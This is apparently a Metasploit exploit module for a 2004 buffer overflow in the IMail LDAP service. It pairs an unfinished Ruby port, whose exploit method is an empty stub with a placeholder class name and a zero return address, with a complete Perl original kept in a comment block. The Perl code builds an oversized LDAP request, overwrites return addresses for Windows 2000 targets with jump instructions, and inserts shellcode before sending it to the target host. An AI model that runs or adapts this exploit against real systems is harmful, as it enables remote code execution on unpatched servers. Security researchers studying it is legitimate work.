require 'msf/core'

module Msf

class Exploits::Windows::XXX_CHANGEME_XXX < Msf::Exploit::Remote

	include Exploit::Remote::Tcp

	def initialize(info = {})
		super(update_info(info,	
			'Name'           => 'IMail LDAP Service Buffer Overflow',
			'Description'    => %q{
				This exploits a buffer overflow in the LDAP service that is
				part of the IMail product. This module was tested against
				version 7.10 and 8.5, both running on Windows 2000.
					
			},
			'Author'         => [ 'hdm' ],
			'Version'        => '$Revision$',
			'References'     =>
				[
					[ 'OSVDB', '3984'],
					[ 'URL', 'http://secunia.com/advisories/10880/'],
					[ 'MIL', '34'],

				],
			'Privileged'     => false,
			'Payload'        =>
				{
					'Space'    => 1024,
					'BadChars' => "\x00\x0a\x0d\x20",

				},
			'Targets'        => 
				[
					[ 
						'Automatic Targetting',
						{
							'Platform' => 'win32, win2000',
							'Ret'      => 0x0,
						},
					],
				],
			'DisclosureDate' => 'Feb 17 2004',
			'DefaultTarget' => 0))
	end

	def exploit
		connect
		
		handler
		disconnect
	end

=begin

##
# This file is part of the Metasploit Framework and may be redistributed
# according to the licenses defined in the Authors field below. In the
# case of an unknown or missing license, this file defaults to the same
# license as the core Framework (dual GPLv2 and Artistic). The latest
# version of the Framework can always be obtained from metasploit.com.
##

package Msf::Exploit::imail_ldap;
use base "Msf::Exploit";
use strict;
use Pex::Text;

my $advanced = { };
my $info =
  {
	'Name'    => 'IMail LDAP Service Buffer Overflow',
	'Version' => '$Revision$',
	'Authors' => [ 'H D Moore <hdm [at] metasploit.com>', ],

	'Arch'  => [ 'x86' ],
	'OS'    => [ 'win32', 'win2000' ],
	'Priv'  => 0,

	'UserOpts'  =>
	  {
		'RHOST' => [1, 'ADDR', 'The target address'],
		'RPORT' => [1, 'PORT', 'The target port', 389],
		'SSL'   => [0, 'BOOL', 'Use SSL'],
	  },

	'Payload' =>
	  {
		'Space'  => 1024,
		'BadChars'  => "\x00\x0a\x0d\x20",
	  },

	'Description'  => Pex::Text::Freeform(qq{
        This exploits a buffer overflow in the LDAP service that is
        part of the IMail product. This module was tested against
        version 7.10 and 8.5, both running on Windows 2000.    
}),

	'Refs'  =>
	  [
		['OSVDB', '3984'],
		['URL', 'http://secunia.com/advisories/10880/'],
		['MIL', '34'],
	  ],

	'Targets' =>
	  [
		["Windows 2000 English",   0x75023386],
		["Windows 2000 IMail 8.x", 0x1002a619],
	  ],

	'Keys'  => ['imail'],

	'DisclosureDate' => 'Feb 17 2004',
  };

sub new {
	my $class = shift;
	my $self = $class->SUPER::new({'Info' => $info, 'Advanced' => $advanced}, @_);
	return($self);
}

sub Exploit {
	my $self = shift;
	my $target_host = $self->GetVar('RHOST');
	my $target_port = $self->GetVar('RPORT');
	my $target_idx  = $self->GetVar('TARGET');
	my $shellcode   = $self->GetVar('EncodedPayload')->Payload;

	my $target = $self->Targets->[$target_idx];

	my $request =
	  "\x30\x82\x0a\x3d\x02\x01\x01\x60\x82\x01\x36\x02\xff\xff\xff\xff\x20".
	  ("\xcc" x 5000);

	# Universal exploit, targets 6.x, 7.x, and 8.x at once ;)
	# Thanks for johnny cyberpunk for 6/7 vs 8 diffs
	substr($request, 77, 4, "\xeb\x0eXX");              # jmp 14
	substr($request, 81, 4, pack('V', $target->[1]));   # return to above jmp (6/7)
	substr($request, 85, 4, "\xeb\x04XX");              # jmp 6
	substr($request, 89, 4, pack('V', $target->[1]));   # return to above jmp (8)
	substr($request, 93, length($shellcode), $shellcode);

	my $s = Msf::Socket::Tcp->new
	  (
		'PeerAddr'  => $target_host,
		'PeerPort'  => $target_port,
		'LocalPort' => $self->GetVar('CPORT'),
		'SSL'       => $self->GetVar('SSL'),
	  );
	if ($s->IsError) {
		$self->PrintLine('[*] Error creating socket: ' . $s->GetError);
		return;
	}

	$self->PrintLine("[*] Connected to LDAP, trying to exploit ".$target->[0]);
	$s->Send($request);
	sleep(2);
	return;
}


=end


end
end	
